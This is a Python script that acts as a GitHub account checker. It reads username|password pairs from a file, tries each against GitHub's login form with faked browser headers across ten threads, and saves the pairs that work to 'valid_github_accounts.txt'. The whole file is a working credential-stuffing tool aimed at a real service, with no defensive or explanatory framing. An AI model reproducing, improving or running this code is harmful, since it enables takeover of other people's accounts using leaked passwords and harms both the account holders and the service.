from requests import get , post,Session
from bs4 import BeautifulSoup
import re
import time
from bs4 import BeautifulSoup as bs
import requests
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from mahdix import LI_BLACK,LI_WHITE,LI_BLUE,LI_CYAN,LI_GREEN,LI_YELLOW,LI_RED
us = UserAgent()
def login(username,password):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://github.com',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://github.com/login',
        'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': us.chrome,
    }

    serssion = requests.Session()
    get_data= serssion.get('https://github.com/login', headers=headers)
    authenticity_token = re.search(r'name="authenticity_token" value="(.*?)"', get_data.text).group(1)
    timestamp_secret = re.search(r'name="timestamp_secret" value="(.*?)"', get_data.text).group(1)
    timestamp = re.search(r'name="timestamp" value="(.*?)"', get_data.text).group(1)
    data = {
        'commit': 'Sign in',
        'authenticity_token': authenticity_token,
        'add_account': '',
        'login': username,
        'password': password,
        'webauthn-conditional': 'undefined',
        'javascript-support': 'true',
        'webauthn-support': 'supported',
        'webauthn-iuvpaa-support': 'supported',
        'return_to': 'https://github.com/login',
        'allow_signup': '',
        'client_id': '',
        'integration': '',
        'required_field_e1cd': '',
        'timestamp': timestamp,
        'timestamp_secret': timestamp_secret,
    }
    response = serssion.post('https://github.com/session',  headers=headers, data=data)
    sup = BeautifulSoup(response.text,'html.parser')
    print(sup.get_text(strip=True),end='\r')
    if 'Dashboard' in sup.text :
        
        #<meta name="user-login" content="bitwithlab143">
        user_login=re.search(r'name="user-login" content="(.*?)">',response.text)
        if user_login:
            user_login=user_login.group(1)
        else:
            user_login=username
        print(f'{LI_GREEN}Successfully logged in with {LI_WHITE}{username}|{password}{LI_BLUE}{user_login}{LI_WHITE}')
        open('valid_github_accounts.txt','a').write(f'{username}|{password}|{user_login}\n')
    else:
        print(f'{LI_RED}Failed to log in with {LI_WHITE}{username}|{password}',end='\r')



if __name__ == "__main__":
    with open('githubcom_users.txt','r',encoding='utf-8') as f:
        accounts = f.read().splitlines()
    with ThreadPoolExecutor(max_workers=10) as executor:
        for account in accounts:
            username,password = account.split('|')
            executor.submit(login,username,password)


